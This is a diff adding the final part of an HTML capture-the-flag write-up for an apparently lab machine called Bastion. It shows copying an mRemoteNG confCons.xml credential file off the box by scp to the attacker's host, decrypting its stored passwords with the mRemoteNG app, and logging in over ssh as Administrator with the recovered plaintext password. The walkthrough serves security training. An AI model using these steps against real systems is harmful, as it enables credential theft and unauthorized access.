+                &nbsp;Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;0CB3-C487<br>
+                <br>
+                &nbsp;Directory&nbsp;of&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\L</span>4mpje<span style="color:#333333;font-weight:400">\A</span>ppData<span style="color:#333333;font-weight:400">\R</span>oaming<span style="color:#333333;font-weight:400">\m</span>RemoteNG<br>
+                <br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.316&nbsp;confCons.xml<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.194&nbsp;confCons.xml.20190222-1402277353.backup<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.206&nbsp;confCons.xml.20190222-1402339071.backup<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.218&nbsp;confCons.xml.20190222-1402379227.backup<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>02&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.231&nbsp;confCons.xml.20190222-1403070644.backup<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.319&nbsp;confCons.xml.20190222-1403100488.backup<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.318&nbsp;confCons.xml.20190222-1403220026.backup<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.315&nbsp;confCons.xml.20190222-1403261268.backup<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.316&nbsp;confCons.xml.20190222-1403272831.backup<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.315&nbsp;confCons.xml.20190222-1403433299.backup<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;6.316&nbsp;confCons.xml.20190222-1403486580.backup<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;51&nbsp;extApps.xml<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;5.217&nbsp;mRemoteNG.log<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>03&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2.245&nbsp;pnlLayout.xml<br>
+                22-02-2019&nbsp;&nbsp;15<span style="color:#ff9d00;font-weight:700">:</span>01&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Themes<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;14&nbsp;File<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;76.577&nbsp;bytes<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;3&nbsp;Dir<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;11.427.184.640&nbsp;bytes&nbsp;<span style="color:#ff9d00;font-weight:700">free</span><br>
+                <br>
+                l4mpje@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\L</span>4mpje<span style="color:#333333;font-weight:400">\A</span>ppData<span style="color:#333333;font-weight:400">\R</span>oaming<span style="color:#333333;font-weight:400">\m</span>RemoteNG<span style="color:#ffdd00;font-weight:400">&gt;</span><span style="color:#ff9d00;font-weight:700">scp</span>&nbsp;confCons.xml&nbsp;root@10.10.13.120<span style="color:#ff9d00;font-weight:700">:/</span>root<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion<span style="color:#ff9d00;font-weight:700">/</span><br>
+                The&nbsp;authenticity&nbsp;of&nbsp;host&nbsp;<span style="color:#3ad900;font-weight:400">'10.10.13.120&nbsp;(10.10.13.120)'</span>&nbsp;can<span style="color:#3ad900;font-weight:400">'t&nbsp;be&nbsp;established.<br>
+                ECDSA&nbsp;key&nbsp;fingerprint&nbsp;is&nbsp;SHA256:C4gz1fWDA/kH7ayYtaadZsdmwzuGbXelo3WWAbOGZPs.<br>
+                Are&nbsp;you&nbsp;sure&nbsp;you&nbsp;want&nbsp;to&nbsp;continue&nbsp;connecting&nbsp;(yes/no)?<br>
+                Warning:&nbsp;Permanently&nbsp;added&nbsp;'</span>10.10.13.120<span style="color:#3ad900;font-weight:400">'&nbsp;(ECDSA)&nbsp;to&nbsp;the&nbsp;list&nbsp;of&nbsp;known&nbsp;hosts.<br>
+                root@10.10.13.120'</span>s&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span><br>
+                confCons.xml&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;100%&nbsp;6316&nbsp;&nbsp;&nbsp;&nbsp;98.7KB<span style="color:#ff9d00;font-weight:700">/</span>s&nbsp;&nbsp;&nbsp;00<span style="color:#ff9d00;font-weight:700">:</span>00
+            </div>
+        </div><br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>5b) Extract passwords from confCons.xml using mRemoteNG Portable</strong></h3><br>
+        mRemoteNG is a windows only program. I used a windows 10 machine because windows 7 required .NET.<br>
+        Download the portable version of the app, extract etc. - <a href="https://mremoteng.org/download">https://mremoteng.org/download</a><br>
+        <br>
+        Boot mRemoteNG once, then close it.<br>
+        Inside mRemoteNG's folder you'll see a confCons.xml file.<br>
+        <img alt="images\2-2.png" src="images/2-2.png"><br>
+        <br>
+        It should look like this:<br>
+        <img alt="images\2-3.png" src="images/2-3.png"><br>
+        (the <code>Protected</code> value changes every time)<br>
+        <br>
+        Open mRemoteNG and add a new connection with random junk data.<br>
+        <img alt="images\2-4.png" src="images/2-4.png"><br>
+        <br>
+        <img alt="images\2-5.png" src="images/2-5.png"><br>
+        <br>
+        Your confCons.xml file should now look like this, with your newly input connection configuration in it:<br>
+        <img alt="images\2-6.png" src="images/2-6.png"><br>
+        <br>
+        Now you have the format of the xml file in which you can dump the mRemoteNG configurations from the Bastion box.<br>
+        <br>
+        Close mRemoteNG.<br>
+        <br>
+        Copy/paste the configurations (both the <code>&lt;Node</code> values) from Bastion's confCons.xml file:<br>
+        <img alt="images\2-7.png" src="images/2-7.png"><br>
+        <br>
+        into mRemoteNG's confCons.xml file and save it.<br>
+        Open up mRemoteNG again and you should see 2 connections.<br>
+        <img alt="images\2-8.png" src="images/2-8.png"><br>
+        <br>
+        Tools &gt; External Tools<br>
+        <img alt="images\2-9.png" src="images/2-9.png"><br>
+        <br>
+        Create a ‘tool’ to extract the password:<br>
+        <img alt="images\2-10.png" src="images/2-10.png"><br>
+        <br>
+        If you've read the config file you'll notice that the <code>DC</code> connection uses the username <code>Administrator</code>, so try extracting the password from the DC config.<br>
+        <br>
+        Right click DC &gt; External Tools &gt; password revealer<br>
+        <img alt="images\2-11.png" src="images/2-11.png"><br>
+        <br>
+        And you'll get a password.<br>
+        <img alt="images\2-12.png" src="images/2-12.png"><br>
+        <br>
+        <code>ssh</code> in as Administrator...<br>
+            <div class="codebox">
+                root@gotham<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>bastion#&nbsp;<span style="color:#ff9d00;font-weight:700">ssh</span>&nbsp;Administrator@10.10.10.134<br>
+                Administrator@10.10.10.134s&nbsp;password<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;thXLHM96BeKL0ER2<br>
+                <br>
+                Microsoft&nbsp;Windows&nbsp;[Version&nbsp;10.0.14393]<br>
+                <span style="color:#ff9d00;font-weight:700">(</span>c<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;2016&nbsp;Microsoft&nbsp;Corporation.&nbsp;All&nbsp;rights&nbsp;reserved.<br>
+                <br>
+                administrator@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator&gt;
+            </div>
+        </div><br>
+        <br>
+        And we're root! :)<br>
+            <div class="codebox">
+                administrator@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#ffdd00;font-weight:400">&gt;</span><span style="color:#ff9d00;font-weight:700">dir</span><br>
+                &nbsp;Volume&nbsp;<span style="color:#ff9d00;font-weight:700">in</span>&nbsp;drive&nbsp;C&nbsp;has&nbsp;no&nbsp;label.<br>
+                &nbsp;Volume&nbsp;Serial&nbsp;Number&nbsp;is&nbsp;0CB3-C487<br>
+                <br>
+                &nbsp;Directory&nbsp;of&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<br>
+                <br>
+                25-04-2019&nbsp;&nbsp;06<span style="color:#ff9d00;font-weight:700">:</span>08&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;.<br>
+                25-04-2019&nbsp;&nbsp;06<span style="color:#ff9d00;font-weight:700">:</span>08&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;..<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>40&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Contacts<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>40&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Desktop<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>40&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Documents<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>40&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Downloads<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>40&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Favorites<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>40&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Links<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>40&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Music<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>40&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Pictures<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>40&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Saved&nbsp;Games<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>40&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Searches<br>
+                23-02-2019&nbsp;&nbsp;10<span style="color:#ff9d00;font-weight:700">:</span>40&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Videos<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;File<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;bytes<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;13&nbsp;Dir<span style="color:#ff9d00;font-weight:700">(</span>s<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;&nbsp;11.369.656.320&nbsp;bytes&nbsp;<span style="color:#ff9d00;font-weight:700">free</span><br>
+                <br>
+                administrator@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#ffdd00;font-weight:400">&gt;</span>cd&nbsp;Desktop<br>
+                <br>
+                administrator@BASTION&nbsp;C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\U</span>sers<span style="color:#333333;font-weight:400">\A</span>dministrator<span style="color:#333333;font-weight:400">\D</span>esktop<span style="color:#ffdd00;font-weight:400">&gt;</span>type&nbsp;root.txt<br>
+                95885...
+            </div>
+        </div>
+    </writeup>
+</section>
+
+</body>
+</html>
